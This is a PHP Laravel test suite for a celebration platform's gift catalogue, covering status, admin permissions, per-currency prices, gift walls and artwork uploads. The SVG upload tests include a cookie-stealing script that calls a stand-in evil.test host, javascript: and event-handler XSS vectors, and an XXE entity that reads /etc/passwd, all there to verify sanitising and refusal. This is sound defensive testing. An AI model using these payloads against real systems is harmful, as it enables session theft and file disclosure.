<?php

namespace Tests\Feature;

use App\Models\Admin;
use App\Models\Celebration;
use App\Models\Gift;
use App\Models\PlatformAvailableGift;
use App\Models\User;
use Database\Seeders\PlatformGiftSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Str;
use Tests\TestCase;

/**
 * The gift catalogue an admin manages and a guest sends from.
 *
 * The important edge is the status: a gift an admin has not finished, or has
 * deliberately paused, must not be sendable — and the guest-facing pages read
 * a different column from the one the admin sets, so the two have to stay in
 * step.
 */
class GiftCatalogueTest extends TestCase
{
    use RefreshDatabase;

    private function admin(array $permissions = ['gifts.manage']): Admin
    {
        $admin = Admin::create([
            'name'     => 'Catalogue Staff',
            'email'    => 'gifts@celebratemi.com',
            'password' => Hash::make('correct-horse-battery-1'),
            'is_super' => false,
            'status'   => 'active',
        ]);

        $admin->syncPermissions($permissions);

        return $admin->fresh('permissions');
    }

    /** @param array<string, mixed> $attributes */
    private function gift(array $attributes = []): PlatformAvailableGift
    {
        return PlatformAvailableGift::create($attributes + [
            'gift_name'  => 'Birthday Cake ' . Str::random(4),
            'gift_icon'  => 'mdi-cake-variant',
            'gift_price' => 30.00,
            'category'   => 'party',
            'status'     => PlatformAvailableGift::STATUS_ACTIVE,
        ]);
    }

    /* ── The seeded catalogue ───────────────────────────────────────── */

    public function test_the_catalogue_spans_everyday_prices_to_luxury(): void
    {
        $this->seed(PlatformGiftSeeder::class);

        $gifts = PlatformAvailableGift::all();

        $this->assertCount(30, $gifts);

        // The range is the point: a catalogue starting at £20 tells most guests
        // not to bother, and one ending at £20 gives generous ones nowhere to go.
        $this->assertLessThanOrEqual(1.00, $gifts->min('gift_price'));
        $this->assertGreaterThanOrEqual(500.00, $gifts->max('gift_price'));

        foreach (PlatformAvailableGift::CATEGORIES as $key => $label) {
            $this->assertTrue(
                $gifts->contains('category', $key),
                "nothing in the '{$label}' category"
            );
        }

        // Every gift can be drawn and described without an upload.
        foreach ($gifts as $gift) {
            $this->assertMatchesRegularExpression('/^mdi-[a-z0-9-]+$/', $gift->gift_icon, "{$gift->gift_name} has no usable icon");
            $this->assertNotEmpty($gift->gift_description, "{$gift->gift_name} has no description");
        }
    }

    public function test_seeding_twice_updates_rather_than_duplicates(): void
    {
        $this->seed(PlatformGiftSeeder::class);
        $this->seed(PlatformGiftSeeder::class);

        $this->assertSame(30, PlatformAvailableGift::count());
    }

    /* ── Status ─────────────────────────────────────────────────────── */

    public function test_a_pending_gift_is_never_offered_to_guests(): void
    {
        $live    = $this->gift(['gift_name' => 'Live Gift']);
        $pending = $this->gift(['gift_name' => 'Pending Gift', 'status' => PlatformAvailableGift::STATUS_PENDING]);

        $owner       = User::factory()->create();
        $celebration = Celebration::create([
            'uuid'             => (string) Str::uuid(),
            'user_id'          => $owner->id,
            'title'            => 'Gift page',
            'slug'             => 'gift-page-' . Str::random(6),
            'celebration_type' => 'birthday',
            'celebrant_name'   => 'Someone',
            'status'           => 'published',
            'is_public'        => true,
        ]);

        $this->get(route('celebrations.show', $celebration->slug))
            ->assertOk()
            ->assertSee($live->gift_name)
            ->assertDontSee($pending->gift_name);
    }

    public function test_status_and_the_legacy_active_column_stay_in_step(): void
    {
        // The guest-facing queries read is_active; the admin sets status.
        $gift = $this->gift();
        $this->assertTrue($gift->fresh()->is_active);

        $gift->update(['status' => PlatformAvailableGift::STATUS_PENDING]);
        $this->assertFalse($gift->fresh()->is_active);

        $gift->update(['status' => PlatformAvailableGift::STATUS_ACTIVE]);
        $this->assertTrue($gift->fresh()->is_active);
    }

    /* ── The admin module ───────────────────────────────────────────── */

    public function test_an_admin_without_the_permission_cannot_reach_the_catalogue(): void
    {
        $this->actingAs($this->admin(['users.view']), 'admin')
            ->get(route('admin.gifts'))
            ->assertForbidden();
    }

    public function test_an_admin_creates_a_gift(): void
    {
        $this->actingAs($this->admin(), 'admin')
            ->post(route('admin.gifts.store'), [
                'gift_name'        => 'Owambe Ticket',
                'gift_description' => 'For the party after the party.',
                'gift_price'       => 42.50,
                'gift_icon'        => 'mdi-party-popper',
                'accent_color'     => '#7c3aed',
                'category'         => 'party',
                'status'           => 'active',
                'sort_order'       => 100,
            ])
            ->assertRedirect(route('admin.gifts'));

        $gift = PlatformAvailableGift::where('gift_name', 'Owambe Ticket')->firstOrFail();

        $this->assertSame('42.50', (string) $gift->gift_price);
        $this->assertTrue($gift->isActive());
        $this->assertTrue($gift->is_active);

        $this->assertDatabaseHas('admin_audit_logs', ['action' => 'admin.gift.created']);
    }

    /* ── Prices per currency ────────────────────────────────────────── */

    public function test_a_hand_set_price_is_used_instead_of_converting(): void
    {
        $gift = $this->gift(['gift_price' => 30.00]);
        $gift->syncPrices(['NGN' => 45000]);

        // Not 30 × whatever today's rate is — the figure an admin chose.
        $this->assertSame(45000.0, $gift->fresh()->priceIn('NGN'));
        $this->assertSame(30.0, $gift->fresh()->priceIn('USD'));
    }

    public function test_a_currency_with_no_price_falls_back_to_the_default(): void
    {
        // This is what "admin sets a default" means: the base price covers
        // every currency nobody has priced by hand, so adding a market never
        // leaves a gift unpriced.
        config(['currency.fallback_rates.NGN' => 1600.00]);

        $gift = $this->gift(['gift_price' => 10.00]);

        $this->assertFalse($gift->hasExplicitPrice('NGN'));
        $this->assertGreaterThan(0, $gift->priceIn('NGN'));
    }

    public function test_clearing_a_price_returns_that_currency_to_the_default(): void
    {
        $gift = $this->gift(['gift_price' => 30.00]);

        $gift->syncPrices(['NGN' => 45000]);
        $this->assertTrue($gift->fresh()->hasExplicitPrice('NGN'));

        // A blank field means "no explicit price", not "zero".
        $gift->syncPrices(['NGN' => '']);
        $this->assertFalse($gift->fresh()->hasExplicitPrice('NGN'));
        $this->assertDatabaseCount('gift_prices', 0);
    }

    public function test_the_form_offers_an_input_for_every_configured_currency(): void
    {
        // Adding a market is a config edit — the form has to grow on its own,
        // with no migration and no deploy.
        config(['currency.currencies' => [
            'USD' => ['symbol' => '$',  'name' => 'US Dollar',      'decimals' => 2],
            'NGN' => ['symbol' => '₦',  'name' => 'Nigerian Naira', 'decimals' => 2],
            'GHS' => ['symbol' => '₵',  'name' => 'Ghanaian Cedi',  'decimals' => 2],
        ]]);

        $this->actingAs($this->admin(), 'admin')
            ->get(route('admin.gifts.create'))
            ->assertOk()
            ->assertSee('name="gift_price"', false)          // the default
            ->assertSee('name="prices[NGN]"', false)
            ->assertSee('name="prices[GHS]"', false)
            ->assertSee('Ghanaian Cedi');
    }

    public function test_an_admin_sets_a_price_per_currency(): void
    {
        $this->actingAs($this->admin(), 'admin')
            ->post(route('admin.gifts.store'), [
                'gift_name'  => 'Priced Everywhere',
                'gift_price' => 30,
                'category'   => 'party',
                'status'     => 'active',
                'sort_order' => 10,
                'prices'     => ['NGN' => 45000],
            ])
            ->assertRedirect(route('admin.gifts'));

        $gift = PlatformAvailableGift::where('gift_name', 'Priced Everywhere')->firstOrFail();

        $this->assertSame(45000.0, $gift->priceIn('NGN'));
        $this->assertDatabaseHas('gift_prices', ['platform_gift_id' => $gift->id, 'currency' => 'NGN']);
    }

    public function test_a_currency_that_is_not_configured_is_refused(): void
    {
        $this->actingAs($this->admin(), 'admin')
            ->post(route('admin.gifts.store'), [
                'gift_name'  => 'Bad Currency',
                'gift_price' => 30,
                'category'   => 'party',
                'status'     => 'active',
                'sort_order' => 10,
                'prices'     => ['XXX' => 100],
            ])
            ->assertSessionHasErrors('prices');

        $this->assertDatabaseMissing('platform_available_gifts', ['gift_name' => 'Bad Currency']);
    }

    public function test_a_guest_is_charged_the_price_set_for_their_currency(): void
    {
        // The whole point: what the page shows and what the gateway charges
        // are the same number.
        $gift = $this->gift(['gift_price' => 30.00]);
        $gift->syncPrices(['NGN' => 45000]);

        $owner = User::factory()->create();
        $owner->forceFill(['currency' => 'NGN'])->save();

        $celebration = Celebration::create([
            'uuid'             => (string) Str::uuid(),
            'user_id'          => $owner->id,
            'title'            => 'Naira page',
            'slug'             => 'naira-page-' . Str::random(6),
            'celebration_type' => 'birthday',
            'celebrant_name'   => 'Someone',
            'status'           => 'published',
            'is_public'        => true,
        ]);

        $response = $this->get(route('celebrations.show', $celebration->slug))->assertOk();

        $shown = collect($response->viewData('platformGifts'))->firstWhere('id', $gift->id);

        $this->assertSame(45000.0, (float) $shown->displayPrice);
    }

    /**
     * The gift wall on the cover opens the same send-a-gift panel as the grid,
     * so it has to hand it the same price.
     *
     * It used to pass the amount already received for that gift — zero for
     * anything nobody had sent yet — so every suggested gift opened showing
     * ₦0.00.
     */
    public function test_the_gift_wall_offers_the_price_not_the_amount_received(): void
    {
        $gift = $this->gift(['gift_price' => 30.00]);
        $gift->syncPrices(['NGN' => 45000]);

        $owner = User::factory()->create();
        $owner->forceFill(['currency' => 'NGN'])->save();

        $celebration = Celebration::create([
            'uuid'             => (string) Str::uuid(),
            'user_id'          => $owner->id,
            'title'            => 'Wall page',
            'slug'             => 'wall-page-' . Str::random(6),
            'celebration_type' => 'birthday',
            'celebrant_name'   => 'Someone',
            'status'           => 'published',
            'is_public'        => true,
        ]);

        $html = $this->get(route('celebrations.show', $celebration->slug))->assertOk()->getContent();

        preg_match_all('/open-gift-detail.*?price:\s*([0-9.]+)/s', $html, $matches);

        $this->assertNotEmpty($matches[1], 'the gift wall rendered no tiles to check');

        foreach ($matches[1] as $price) {
            $this->assertGreaterThan(0, (float) $price, 'a gift wall tile still offers a price of zero');
        }

        $this->assertContains('45000', $matches[1]);
    }

    /**
     * The Received wall shows what was received, and nothing else.
     *
     * It used to top itself up from the catalogue, so a celebration with one
     * gift looked like it had six.
     */
    public function test_the_received_wall_shows_only_gifts_that_arrived(): void
    {
        $this->seed(PlatformGiftSeeder::class);

        $sent      = PlatformAvailableGift::where('gift_name', 'Birthday Cake')->firstOrFail();
        $notSent   = PlatformAvailableGift::where('gift_name', 'Champagne Toast')->firstOrFail();
        $unpaid    = PlatformAvailableGift::where('gift_name', 'Single Rose')->firstOrFail();

        $owner = User::factory()->create();
        $owner->forceFill(['currency' => 'NGN'])->save();

        $celebration = Celebration::create([
            'uuid'             => (string) Str::uuid(),
            'user_id'          => $owner->id,
            'title'            => 'Received wall',
            'slug'             => 'received-wall-' . Str::random(6),
            'celebration_type' => 'birthday',
            'celebrant_name'   => 'Someone',
            'status'           => 'published',
            'is_public'        => true,
        ]);

        $send = fn (PlatformAvailableGift $gift, string $status) => Gift::create([
            'celebration_id'        => $celebration->id,
            'platform_gift_id'      => $gift->id,
            'sender_name'           => 'A Guest',
            'sender_email'          => 'guest@example.com',
            'amount'                => 45000,
            'currency'              => 'NGN',
            'guest_currency'        => 'NGN',
            'conversion_rate'       => 1,
            'payment_method'        => 'card',
            'transaction_reference' => 'gift-pay-' . Str::uuid(),
            'payment_status'        => $status,
            'is_anonymous'          => false,
        ]);

        $send($sent, 'paid');
        $send($sent, 'paid');       // twice, so the tile carries a count
        $send($unpaid, 'pending');  // never arrived

        $wall = $celebration->fresh()->load('gifts.platformGift')->sidebarGifts();

        $this->assertCount(1, $wall, 'the wall should hold only the gift that was actually paid for');
        $this->assertSame($sent->id, $wall->first()->gift->id);
        $this->assertSame(2, $wall->first()->count);

        $names = $wall->pluck('gift.gift_name');
        $this->assertNotContains($notSent->gift_name, $names);
        $this->assertNotContains($unpaid->gift_name, $names);
    }

    public function test_a_celebration_with_no_gifts_shows_an_empty_wall(): void
    {
        $this->seed(PlatformGiftSeeder::class);

        $owner = User::factory()->create();

        $celebration = Celebration::create([
            'uuid'             => (string) Str::uuid(),
            'user_id'          => $owner->id,
            'title'            => 'Empty wall',
            'slug'             => 'empty-wall-' . Str::random(6),
            'celebration_type' => 'birthday',
            'celebrant_name'   => 'Someone',
            'status'           => 'published',
            'is_public'        => true,
        ]);

        $this->assertCount(0, $celebration->sidebarGifts());

        $this->get(route('celebrations.show', $celebration->slug))
            ->assertOk()
            ->assertSee('No gifts received yet', false);
    }

    public function test_the_seeded_catalogue_carries_naira_prices(): void
    {
        $this->seed(PlatformGiftSeeder::class);

        $gifts = PlatformAvailableGift::with('prices')->get();

        $this->assertSame(30, $gifts->filter(fn ($g) => $g->hasExplicitPrice('NGN'))->count());

        // Round figures, not conversions: nobody prices a gift at ₦651.37.
        foreach ($gifts as $gift) {
            $naira = $gift->priceIn('NGN');
            $this->assertSame(0.0, fmod($naira, 100), "{$gift->gift_name} is ₦{$naira}, which is not a round price");
        }
    }

    /* ── Artwork ────────────────────────────────────────────────────── */

    public function test_an_admin_uploads_a_png_for_a_gift(): void
    {
        Storage::fake('public');

        $this->actingAs($this->admin(), 'admin')
            ->post(route('admin.gifts.store'), [
                'gift_name'  => 'Painted Cake',
                'gift_price' => 30,
                'category'   => 'party',
                'status'     => 'active',
                'sort_order' => 10,
                'gift_image' => UploadedFile::fake()->image('cake.png', 240, 240),
            ])
            ->assertRedirect(route('admin.gifts'));

        $gift = PlatformAvailableGift::where('gift_name', 'Painted Cake')->firstOrFail();

        $this->assertNotNull($gift->gift_image_url);
        $this->assertStringStartsWith('gifts/', $gift->gift_image_url);
        Storage::disk('public')->assertExists($gift->gift_image_url);
    }

    public function test_an_svg_is_accepted_and_stored(): void
    {
        Storage::fake('public');

        $svg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">'
             . '<path d="M12 2 L22 22 H2 Z" fill="#7c3aed"/></svg>';

        $this->actingAs($this->admin(), 'admin')
            ->post(route('admin.gifts.store'), [
                'gift_name'  => 'Vector Cake',
                'gift_price' => 30,
                'category'   => 'party',
                'status'     => 'active',
                'sort_order' => 10,
                'gift_image' => UploadedFile::fake()->createWithContent('cake.svg', $svg),
            ])
            ->assertSessionHasNoErrors();

        $gift = PlatformAvailableGift::where('gift_name', 'Vector Cake')->firstOrFail();

        $this->assertStringEndsWith('.svg', $gift->gift_image_url);

        $stored = Storage::disk('public')->get($gift->gift_image_url);
        $this->assertStringContainsString('<path', $stored);
    }

    public function test_a_scripted_svg_is_stripped_before_it_is_ever_stored(): void
    {
        Storage::fake('public');

        // An SVG is served from our own origin, so anything executable in it
        // runs as us. This is the upload that matters.
        $hostile = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">'
                 . '<script>fetch("https://evil.test/steal?c="+document.cookie)</script>'
                 . '<a xlink:href="javascript:alert(1)"><rect width="24" height="24"/></a>'
                 . '<circle cx="12" cy="12" r="10" onload="alert(2)" onclick="alert(3)" fill="#000"/>'
                 . '<foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><iframe src="//evil.test"></iframe></body></foreignObject>'
                 . '</svg>';

        $this->actingAs($this->admin(), 'admin')
            ->post(route('admin.gifts.store'), [
                'gift_name'  => 'Hostile Cake',
                'gift_price' => 30,
                'category'   => 'party',
                'status'     => 'active',
                'sort_order' => 10,
                'gift_image' => UploadedFile::fake()->createWithContent('hostile.svg', $hostile),
            ]);

        $gift   = PlatformAvailableGift::where('gift_name', 'Hostile Cake')->firstOrFail();
        $stored = Storage::disk('public')->get($gift->gift_image_url);

        foreach (['<script', 'javascript:', 'onload', 'onclick', 'foreignObject', 'iframe', 'evil.test'] as $nasty) {
            $this->assertStringNotContainsStringIgnoringCase($nasty, $stored, "{$nasty} survived sanitising");
        }

        // The drawing itself is kept.
        $this->assertStringContainsString('<circle', $stored);
    }

    public function test_an_svg_carrying_an_external_entity_is_refused(): void
    {
        Storage::fake('public');

        $xxe = '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
             . '<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>';

        $this->actingAs($this->admin(), 'admin')
            ->post(route('admin.gifts.store'), [
                'gift_name'  => 'XXE Cake',
                'gift_price' => 30,
                'category'   => 'party',
                'status'     => 'active',
                'sort_order' => 10,
                'gift_image' => UploadedFile::fake()->createWithContent('xxe.svg', $xxe),
            ])
            ->assertSessionHasErrors('gift_image');

        $this->assertDatabaseMissing('platform_available_gifts', ['gift_name' => 'XXE Cake']);
    }

    public function test_other_file_types_are_refused(): void
    {
        Storage::fake('public');

        $admin = $this->admin();

        foreach (['payload.php', 'sheet.pdf', 'photo.jpg'] as $filename) {
            $this->actingAs($admin, 'admin')
                ->post(route('admin.gifts.store'), [
                    'gift_name'  => 'Bad Upload ' . $filename,
                    'gift_price' => 30,
                    'category'   => 'party',
                    'status'     => 'active',
                    'sort_order' => 10,
                    'gift_image' => UploadedFile::fake()->create($filename, 20),
                ])
                ->assertSessionHasErrors('gift_image');
        }
    }

    public function test_replacing_an_image_removes_the_old_file(): void
    {
        Storage::fake('public');

        $admin = $this->admin();
        $gift  = $this->gift();

        $this->actingAs($admin, 'admin')->put(route('admin.gifts.update', $gift), [
            'gift_name'  => $gift->gift_name,
            'gift_price' => 30,
            'category'   => 'party',
            'status'     => 'active',
            'sort_order' => 10,
            'gift_image' => UploadedFile::fake()->image('first.png'),
        ]);

        $first = $gift->fresh()->gift_image_url;

        $this->actingAs($admin, 'admin')->put(route('admin.gifts.update', $gift), [
            'gift_name'  => $gift->gift_name,
            'gift_price' => 30,
            'category'   => 'party',
            'status'     => 'active',
            'sort_order' => 10,
            'gift_image' => UploadedFile::fake()->image('second.png'),
        ]);

        $second = $gift->fresh()->gift_image_url;

        $this->assertNotSame($first, $second);
        Storage::disk('public')->assertMissing($first);
        Storage::disk('public')->assertExists($second);
    }

    public function test_an_image_can_be_removed_and_the_icon_takes_over(): void
    {
        Storage::fake('public');

        $admin = $this->admin();
        $gift  = $this->gift();

        $this->actingAs($admin, 'admin')->put(route('admin.gifts.update', $gift), [
            'gift_name'  => $gift->gift_name,
            'gift_price' => 30,
            'category'   => 'party',
            'status'     => 'active',
            'sort_order' => 10,
            'gift_image' => UploadedFile::fake()->image('cake.png'),
        ]);

        $path = $gift->fresh()->gift_image_url;
        $this->assertNotNull($path);

        $this->actingAs($admin, 'admin')->put(route('admin.gifts.update', $gift), [
            'gift_name'    => $gift->gift_name,
            'gift_price'   => 30,
            'category'     => 'party',
            'status'       => 'active',
            'sort_order'   => 10,
            'gift_icon'    => 'mdi-cake-variant',
            'remove_image' => 1,
        ]);

        $this->assertNull($gift->fresh()->gift_image_url);
        Storage::disk('public')->assertMissing($path);
        $this->assertSame('mdi-cake-variant', $gift->fresh()->icon());
    }

    public function test_a_gift_needs_a_real_icon_name(): void
    {
        $this->actingAs($this->admin(), 'admin')
            ->post(route('admin.gifts.store'), [
                'gift_name'  => 'Bad Icon',
                'gift_price' => 10,
                'gift_icon'  => 'https://example.com/cake.png',
                'category'   => 'party',
                'status'     => 'active',
                'sort_order' => 10,
            ])
            ->assertSessionHasErrors('gift_icon');

        $this->assertDatabaseMissing('platform_available_gifts', ['gift_name' => 'Bad Icon']);
    }

    public function test_an_admin_pauses_and_publishes_a_gift(): void
    {
        $admin = $this->admin();
        $gift  = $this->gift();

        $this->actingAs($admin, 'admin')->patch(route('admin.gifts.toggle', $gift));
        $this->assertFalse($gift->fresh()->isActive());

        $this->actingAs($admin, 'admin')->patch(route('admin.gifts.toggle', $gift));
        $this->assertTrue($gift->fresh()->isActive());
    }

    public function test_a_gift_that_has_been_sent_is_retired_rather_than_deleted(): void
    {
        $admin = $this->admin();
        $gift  = $this->gift();
        $owner = User::factory()->create();

        $celebration = Celebration::create([
            'uuid'             => (string) Str::uuid(),
            'user_id'          => $owner->id,
            'title'            => 'Sent gifts',
            'slug'             => 'sent-gifts-' . Str::random(6),
            'celebration_type' => 'birthday',
            'celebrant_name'   => 'Someone',
            'status'           => 'published',
            'is_public'        => true,
        ]);

        Gift::create([
            'celebration_id'        => $celebration->id,
            'platform_gift_id'      => $gift->id,
            'sender_name'           => 'A Guest',
            'sender_email'          => 'guest@example.com',
            'amount'                => 30,
            'currency'              => 'NGN',
            'guest_currency'        => 'NGN',
            'conversion_rate'       => 1,
            'payment_method'        => 'card',
            'transaction_reference' => 'gift-pay-' . Str::uuid(),
            'payment_status'        => 'paid',
            'is_anonymous'          => false,
        ]);

        $this->actingAs($admin, 'admin')->delete(route('admin.gifts.destroy', $gift));

        // Deleting it would orphan somebody's celebration and the payment
        // record behind it.
        $this->assertDatabaseHas('platform_available_gifts', [
            'id'     => $gift->id,
            'status' => PlatformAvailableGift::STATUS_PENDING,
        ]);
    }

    public function test_an_unsent_gift_can_be_deleted_outright(): void
    {
        $gift = $this->gift();

        $this->actingAs($this->admin(), 'admin')->delete(route('admin.gifts.destroy', $gift));

        $this->assertDatabaseMissing('platform_available_gifts', ['id' => $gift->id]);
    }
}
